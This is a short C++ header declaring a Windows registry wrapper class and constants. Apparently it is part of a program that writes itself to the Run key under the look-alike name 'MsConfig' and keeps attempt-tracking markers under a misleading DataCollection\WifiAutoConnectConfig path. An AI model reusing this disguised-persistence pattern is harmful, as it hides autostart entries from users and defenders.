#pragma once
#include "WindowsException.hpp"
#include <iostream>
#include <Windows.h>

constexpr wchar_t* STARTUP_REG = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
constexpr wchar_t* SAFETY_REG = L"SOFTWARE\\Microsoft\\DataCollection\\Default\\WifiAutoConnectConfig";
constexpr wchar_t* MS_CONFIG = L"MsConfig";
constexpr wchar_t* LAST_ATTEMPT_KEY = L"LastAttempt";
constexpr wchar_t* SAFETY_KEY = L"MaxScore";
constexpr wchar_t* SAFETY_VALUE = L"2.0";
constexpr wchar_t* SUCCESS = L"Success";
constexpr wchar_t* FAILED = L"Failed";

const class RegistryKey
{
public:
	explicit RegistryKey(const HKEY key, const std::wstring& subkey);
	~RegistryKey();

public:
	std::wstring get_value(const std::wstring& value_name);
	void set_value(const std::wstring& value_name, const std::wstring& value_data);

private:
	static HKEY open_key(const HKEY key, const std::wstring& subkey);

private:
	HKEY key_handle;
};

